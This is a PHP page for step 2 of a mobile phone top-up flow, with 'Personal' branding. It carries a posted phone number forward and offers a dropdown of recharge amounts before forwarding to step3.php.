<?php
/**
 * STEP 2 - Recibe teléfono, pide monto
 * Sin sesiones - usa POST hidden
 */

// Recibir teléfono del paso anterior
$phone = isset($_POST['phone']) ? trim($_POST['phone']) : '';

// Si viene de step3 con POST, redirigir
if(isset($_POST['amount']) && !empty($_POST['amount'])) {
    // Ya eligió monto, redirigir a step3
    ?>
    <!DOCTYPE html>
    <html>
    <head><title>Redirigiendo...</title></head>
    <body>
        <form id="autoForm" method="POST" action="step3.php">
            <input type="hidden" name="phone" value="<?php echo htmlspecialchars($phone); ?>">
            <input type="hidden" name="amount" value="<?php echo htmlspecialchars($_POST['amount']); ?>">
        </form>
        <script>document.getElementById('autoForm').submit();</script>
    </body>
    </html>
    <?php
    exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Monto | Personal</title>
    <link rel="stylesheet" href="css/op/bootstrap.min.css">
    <link rel="stylesheet" href="css/op/styles.css">
</head>
<body style="background-color: #e5e5e5;">
    <div class="container-fluid">
        <div class="row">
            <div class="col-12 p-0">
                <header class="header">
                    <nav class="px-0 pt-0">
                        <div class="d-flex justify-content-between align-items-center" style="padding: 20px;">
                            <div>
                                <img src="assets/flow.svg" style="height: 40px;">
                            </div>
                            <div>
                                <img src="assets/secure.svg" style="height: 30px;">
                            </div>
                        </div>
                    </nav>
                </header>

                <div class="row justify-content-center mt-5">
                    <div class="col-12 text-center">
                        <h1 style="color: #333; font-size: 28px; margin-bottom: 30px;">Seleccioná el monto</h1>
                    </div>

                    <div class="col-11 col-sm-6">
                        <form method="POST" action="step2.php">
                            <input type="hidden" name="phone" value="<?php echo htmlspecialchars($phone); ?>">
                            
                            <div class="form-group">
                                <label style="color: #666; font-size: 16px;">Monto a recargar</label>
                                <select name="amount" id="amount" class="form-control" style="height: 50px; font-size: 16px;" required>
                                    <option value="">Seleccionar monto</option>
                                    <option value="100">$100</option>
                                    <option value="200">$200</option>
                                    <option value="300">$300</option>
                                    <option value="500">$500</option>
                                    <option value="1000">$1000</option>
                                    <option value="2000">$2000</option>
                                </select>
                            </div>

                            <div class="text-center mt-4">
                                <button type="button" onclick="window.history.back()" class="btn btn-secondary px-4 py-2 mr-2">Volver</button>
                                <button type="submit" id="btnContinuar" class="btn btn-primary px-4 py-2" disabled style="background: #00a8e1; border: none;">Continuar</button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="javascript/query.min.js"></script>
    <script>
        $('#amount').on('change', function(){
            $('#btnContinuar').prop('disabled', $(this).val() === '');
        });
    </script>
</body>
</html>